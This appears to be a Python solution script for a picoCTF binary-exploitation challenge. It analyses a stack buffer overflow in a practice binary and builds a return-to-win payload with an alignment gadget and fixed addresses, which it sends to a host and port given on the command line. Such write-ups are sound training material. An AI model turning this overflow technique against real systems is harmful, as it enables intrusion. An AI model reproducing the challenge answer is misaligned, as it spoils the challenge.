#!/usr/bin/env python3
"""
Solves CyLab Security Academy / picoCTF 2026 Challenge 755: Echo Escape 1
Category: Binary Exploitation
Difficulty: Medium (2)

Vulnerability Analysis:
- Architecture: x86_64 ELF non-PIE executable (vuln).
- Flaw: Unbounded input read via read(0, buf, 128) into stack buffer buf[32].
- Stack Layout:
    buf is at [rbp - 0x20] (32 bytes).
    Saved RBP is 8 bytes at [rbp].
    Return address is at offset 32 + 8 = 40 bytes.
- Target: Function win() located at 0x00401256.
- Stack Alignment: Requires 16-byte alignment before function calls (SSE instruction movaps in printf/system).
  Included a 'ret' gadget at 0x0040101a prior to win() address.
"""

import socket
import struct
import sys
import time

WIN_ADDR = 0x00401256
RET_GADGET = 0x0040101a
PAYLOAD_OFFSET = 40

def build_payload() -> bytes:
    # 32 bytes buffer + 8 bytes saved RBP + ret gadget (alignment) + win()
    payload = b"A" * PAYLOAD_OFFSET
    payload += struct.pack("<Q", RET_GADGET)
    payload += struct.pack("<Q", WIN_ADDR)
    payload += b"\n"
    return payload

def exploit_remote(host: str, port: int) -> str:
    print(f"[*] Connecting to {host}:{port}...")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(10.0)
    s.connect((host, port))
    
    banner = s.recv(1024)
    print(f"[*] Banner received: {banner.decode('latin-1', 'replace').strip()}")
    
    payload = build_payload()
    print(f"[*] Sending {len(payload)} bytes payload...")
    s.sendall(payload)
    
    time.sleep(1)
    response = b""
    while True:
        try:
            s.settimeout(3.0)
            chunk = s.recv(1024)
            if not chunk:
                break
            response += chunk
        except Exception:
            break
    s.close()
    
    text = response.decode("latin-1", "replace")
    print(f"[*] Response:\n{text}")
    return text

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print(f"Usage: {sys.argv[0]} <host> <port>")
        print("Defaulting to sample verification...")
        p = build_payload()
        print(f"Generated payload: {p.hex()}")
        sys.exit(0)
    
    host = sys.argv[1]
    port = int(sys.argv[2])
    exploit_remote(host, port)
